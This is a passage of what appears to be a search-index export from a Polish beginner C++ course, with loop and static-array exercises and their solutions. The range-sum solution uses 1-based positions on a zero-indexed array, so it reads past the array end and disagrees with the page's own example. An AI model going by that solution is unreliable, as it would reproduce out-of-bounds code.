specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#specyfikacja_7","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_8","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#wynik_7","title":"Wynik","text":"<ul> <li>Wszystkie tr\u00f3jki liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/#dane_9","title":"Dane","text":"<pre><code>n := 4\n</code></pre> <p>Wynik: \\((0, 0, 4), (0, 1, 3), (0, 2, 2), (1, 1, 2)\\)</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-1/#wynik","title":"Wynik","text":"<ul> <li>\\(n!\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, silnia;\n\n    silnia = 1;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    for (int i = 2; i &lt;= n; i++) {\n        silnia *= i;\n    }\n\n    cout &lt;&lt; n &lt;&lt; \"! = \" &lt;&lt; silnia &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z funkcji <code>pow</code>.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a, n\\) - dwie liczby naturalne</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-2/#wynik","title":"Wynik","text":"<ul> <li>\\(a^n\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int a, n, wynik;\n\n    wynik = 1;\n\n    cout &lt;&lt; \"Podaj dwie liczby:\" &lt;&lt; endl;\n    cin &gt;&gt; a &gt;&gt; n;\n\n    for(int i = 1; i &lt;= n; i++) {\n        wynik *= a;\n    }\n\n    cout &lt;&lt; a &lt;&lt; \"^\" &lt;&lt; n &lt;&lt; \" = \" &lt;&lt; wynik &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(n\\)liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Suma podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, suma, liczba;\n\n    suma = 0;\n\n    cout &lt;&lt; \"Podaj ilosc liczb:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    for (int i = 1; i &lt;= n; i++) {\n        cout &lt;&lt; \"Podaj liczbe nr \" &lt;&lt; i &lt;&lt; endl;\n        cin &gt;&gt; liczba;\n\n        suma += liczba;\n    }\n\n    cout &lt;&lt; \"Suma: \" &lt;&lt; suma &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, wi\u0119ksza od \\(0\\) </li> <li>\\(n\\)liczb naturalnych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, maks, liczba;\n\n    maks = -1;\n\n    cout &lt;&lt; \"Podaj ilosc liczb:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    for (int i = 1; i &lt;= n; i++) {\n        cout &lt;&lt; \"Podaj liczbe nr \" &lt;&lt; i &lt;&lt; endl;\n        cin &gt;&gt; liczba;\n\n        if (liczba &gt; maks) {\n            maks = liczba;\n        }\n    }\n\n    cout &lt;&lt; \"Maksimum: \" &lt;&lt; maks &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n, k\\) - liczby naturalne, wi\u0119ksze od zera</li> <li>\\(n\\)liczb naturalnych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Ilo\u015b\u0107 liczb podzielnych przez \\(k\\) z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, k, podzielne, liczba;\n\n    podzielne = 0;\n\n    cout &lt;&lt; \"Podaj ilosc liczb:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    cout &lt;&lt; \"Podaj dzielnik:\" &lt;&lt; endl;\n    cin &gt;&gt; k;\n\n    for (int i = 1; i &lt;= n; i++) {\n        cout &lt;&lt; \"Podaj liczbe nr \" &lt;&lt; i &lt;&lt; endl;\n        cin &gt;&gt; liczba;\n\n        if (liczba % k == 0) {\n            podzielne += 1;\n        }\n    }\n\n    cout &lt;&lt; \"Podzielne: \" &lt;&lt; podzielne &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Tabliczka mno\u017cenia z zakresu \\([1,n]\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    for (int i = 1; i &lt;= n; i++) {\n        for (int j = 1; j &lt;= n; j++) {\n            cout &lt;&lt; i * j &lt;&lt; \" \";\n        }\n\n        cout &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie pary liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    for (int i = 0; i &lt;= n / 2; i++) {\n        cout &lt;&lt; \"(\" &lt;&lt; i &lt;&lt; \", \" &lt;&lt; n - i &lt;&lt; \")\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-8/","title":"Rozwi\u0105zanie 8","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-8/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-8/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-8/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-8/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie tr\u00f3jki liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/iterative-loop/solution-8/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n\n    cout &lt;&lt; \"Podaj liczbe:\" &lt;&lt; endl;\n    cin &gt;&gt; n;\n\n    for (int i = 0; i &lt;= n / 3; i++) {\n        for (int j = i; j &lt;= (n - i) / 2; j++) {\n            cout &lt;&lt; \"(\" &lt;&lt; i &lt;&lt; \", \" &lt;&lt; j &lt;&lt; \", \" &lt;&lt; n - i - j &lt;&lt; \")\" &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/","title":"Tablice statyczne","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik","title":"Wynik","text":"<ul> <li>\\(a_n,a_{n-1},\\dots,a_2,a_1\\) - podane liczby w odwrotnej kolejno\u015bci</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_1","title":"Dane","text":"<pre><code>n := 5\na1 := 1\na2 := 2\na3 := 3\na4 := 4\na5 := 5\n</code></pre> <p>Wynik: \\(5, 4, 3, 2, 1\\) </p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(k\\) - liczba naturalna, \\(1&lt;=k&lt;=n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_1","title":"Wynik","text":"<ul> <li>\\(a_k\\) - \\(k\\)-ta podana liczba</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_3","title":"Dane","text":"<pre><code>n := 5\n\na1 := 8\na2 := 3\na3 := 9\na4 := 1\na5 := 2\n\nk := 3\n</code></pre> <p>Wynik: \\(9\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(k := 3\\), a trzecia podana warto\u015b\u0107 wynosi \\(9\\) (a3 := 9). </p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_4","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(p, k\\) - dwie liczby naturalna, \\(1&lt;=p,k&lt;=n\\), \\(p &lt;= k\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_2","title":"Wynik","text":"<ul> <li>\\(a_p+a_{p+1}+a_{p+2}+...+a_{k}\\) - suma warto\u015bci na pozycjach od \\(p\\) do \\(k\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_5","title":"Dane","text":"<pre><code>n := 5\n\na1 := 8\na2 := 3\na3 := 9\na4 := 1\na5 := 2\n\np := 3\nk := 5\n</code></pre> <p>Wynik: \\(12\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(a_3+a_4+a_5=9+1+2=12\\)</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_6","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(t1[n],\\ t2[n]\\) - dwie tablice liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_3","title":"Wynik","text":"<ul> <li>Tablica powsta\u0142a poprzez dodanie do siebie warto\u015bci z tablic \\(t1\\) i \\(t2\\) </li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_7","title":"Dane","text":"<pre><code>n := 5\nt1 := [4, 1, 7, 0, 2]\nt2 := [2, 3, 1, 9, 6]\n</code></pre> <p>Wynik: \\(6, 4, 8, 9, 8\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\([4+2,\\ 1+3,\\ 7+1,\\ 0+9,\\ 2+6]\\) </p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_8","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_4","title":"Wynik","text":"<ul> <li>\\(fib[n]\\) - tablica zawieraj\u0105ca \\(n\\) kolejnych liczb Fibonacciego</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_9","title":"Dane","text":"<pre><code>n := 6\n</code></pre> <p>Wynik: \\(1, 1, 2, 3, 5, 8\\) </p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_10","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_5","title":"Wynik","text":"<ul> <li>\\(mno[n][n]\\) - dwuwymiarowa tablica reprezentuj\u0105ca tabliczk\u0119 mno\u017cenia liczb z zakresu \\([0,n-1]\\), gdzie \\(mno[i][j]=i*j\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad_5","title":"Przyk\u0142ad","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_11","title":"Dane","text":"<pre><code>n := 3\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_6","title":"Wynik","text":"<pre><code>mno := [[0, 0, 0],\n        [0, 1, 2],\n        [0, 2, 4]]\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_12","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - tablica liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#wynik_7","title":"Wynik","text":"<ul> <li>Komunikat \"niemalejaco\" je\u017celi elementy tablicy posortowane s\u0105 niemalej\u0105co</li> <li>Komunikat \"nierosnaco\" je\u017celi elementy tablicy posortowane s\u0105 nierosn\u0105co</li> <li>Komunikat \"nieposortowane\" je\u017celi elementy tablicy nie s\u0105 posortowane</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_13","title":"Dane","text":"<pre><code>n := 5\ntab := [1, 1, 5, 6, 8]\n</code></pre> <p>Wynik: \"niemalej\u0105co\"</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_14","title":"Dane","text":"<pre><code>n := 5\ntab := [8, 5, 5, 3, 1]\n</code></pre> <p>Wynik: \"nierosn\u0105co\"</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/#dane_15","title":"Dane","text":"<pre><code>n := 5\ntab := [1, 2, 3, 1, 5]\n</code></pre> <p>Wynik: \"nieposortowane\"</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. </p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/#wynik","title":"Wynik","text":"<ul> <li>\\(a_n,a_{n-1},\\dots,a_2,a_1\\) - podane liczby w odwrotnej kolejno\u015bci</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int tab[n];\n\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj kolejna wartosc:\" &lt;&lt; endl;\n    cin &gt;&gt; tab[i];\n  }\n\n  for(int i = n - 1; i &gt;= 0; i--) {\n    cout &lt;&lt; tab[i] &lt;&lt; endl;\n  }\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-1/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":"<p>Na pocz\u0105tku tworzymy zmienn\u0105 \\(n\\) (linia 5), w kt\u00f3rej b\u0119dziemy przechowywa\u0107 liczb\u0119 element\u00f3w, kt\u00f3r\u0105 nast\u0119pnie wczytujemy od u\u017cytkownika (linia 8).</p> <p>Gdy ju\u017c znamy liczb\u0119 element\u00f3w, mo\u017cemy utworzy\u0107 tablic\u0119 o odpowiednim rozmiarze. Tworzymy wi\u0119c tablic\u0119 o rozmiarze \\(n\\) (linia 10).</p> <p>W kolejnym kroku, w p\u0119tli wczytujemy kolejne warto\u015bci od u\u017cytkownika i zapisujemy je w tablicy. P\u0119tl\u0105 przechodzimy przez kolejne indeksy w naszej tablicy, tzn. od \\(0\\) do \\(n\\) (linia 12). Licznik p\u0119tli, zmienna <code>i</code>, okre\u015bla indeks w tablicy, pod kt\u00f3rym zapisujemy wczytan\u0105 warto\u015b\u0107 (linia 14).</p> <p>Ostatnim etapem rozwi\u0105zania jest ponowne przej\u015bcie po wszystkich indeksach element\u00f3w, tylko w kolejno\u015bci malej\u0105cej: od ostatniego indeksu (\\(n - 1\\)) do pierwszego indeksu (\\(0\\)) (linia 17). W p\u0119tli wypisujemy warto\u015bci kolejnych element\u00f3w tablicy (linia 18).</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(k\\) - liczba naturalna, \\(1&lt;=k&lt;=n\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/#wynik","title":"Wynik","text":"<ul> <li>\\(a_k\\) - \\(k\\)-ta podana liczba</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n, k;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int tab[n];\n\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj kolejna wartosc:\" &lt;&lt; endl;\n    cin &gt;&gt; tab[i];\n  }\n\n  cout &lt;&lt; \"Podaj numer elementu:\" &lt;&lt; endl;\n  cin &gt;&gt; k;\n\n  cout &lt;&lt; \"Element numer \" &lt;&lt; k &lt;&lt; \" = \" &lt;&lt; tab[k - 1] &lt;&lt; endl;\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-2/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":"<p>Na pocz\u0105tku tworzymy zmienn\u0105 \\(n\\) (linia 5), w kt\u00f3rej b\u0119dziemy przechowywa\u0107 liczb\u0119 element\u00f3w, kt\u00f3r\u0105 nast\u0119pnie wczytujemy od u\u017cytkownika (linia 8).</p> <p>Gdy ju\u017c znamy liczb\u0119 element\u00f3w, mo\u017cemy utworzy\u0107 tablic\u0119 o odpowiednim rozmiarze. Tworzymy wi\u0119c tablic\u0119 o rozmiarze \\(n\\) (linia 10).</p> <p>W kolejnym kroku, w p\u0119tli wczytujemy kolejne warto\u015bci od u\u017cytkownika i zapisujemy je w tablicy. P\u0119tl\u0105 przechodzimy przez kolejne indeksy w naszej tablicy, tzn. od \\(0\\) do \\(n\\) (linia 12). Licznik p\u0119tli, zmienna <code>i</code>, okre\u015bla indeks w tablicy, pod kt\u00f3rym zapisujemy wczytan\u0105 warto\u015b\u0107 (linia 14).</p> <p>Nast\u0119pnie wczytujemy od u\u017cytkownika numer elementu, kt\u00f3ry nale\u017cy wypisa\u0107 (linia 18).</p> <p>Teraz pozosta\u0142o wypisa\u0107 w\u0142a\u015bciwy element. Poniewa\u017c tablica jest numerowana (indeksowana) od zera, nale\u017cy wypisa\u0107 element pod indeksem \\(k - 1\\) (linia 20).</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(p, k\\) - dwie liczby naturalna, \\(1&lt;=p,k&lt;=n\\), \\(p &lt;= k\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-3/#wynik","title":"Wynik","text":"<ul> <li>\\(a_p+a_{p+1}+a_{p+2}+...+a_{k}\\) - suma warto\u015bci na pozycjach od \\(p\\) do \\(k\\)</li> </ul>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nint main() {\n  int n, p, k, suma;\n\n  cout &lt;&lt; \"Podaj liczbe elementow:\" &lt;&lt; endl;\n  cin &gt;&gt; n;\n\n  int tab[n];\n\n  for(int i = 0; i &lt; n; i++) {\n    cout &lt;&lt; \"Podaj kolejna wartosc:\" &lt;&lt; endl;\n    cin &gt;&gt; tab[i];\n  }\n\n  cout &lt;&lt; \"Podaj pozycje pierwszego i ostatniego elementu:\" &lt;&lt; endl;\n  cin &gt;&gt; p &gt;&gt; k;\n\n  suma = 0;\n\n  for(int i = p; i &lt;= k; i++) {\n      suma += tab[i];\n  }\n\n  cout &lt;&lt; \"Suma elementow z podanego zakresu wynosi: \" &lt;&lt; suma &lt;&lt; endl;\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/c%2B%2B/exercises/static-arrays/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 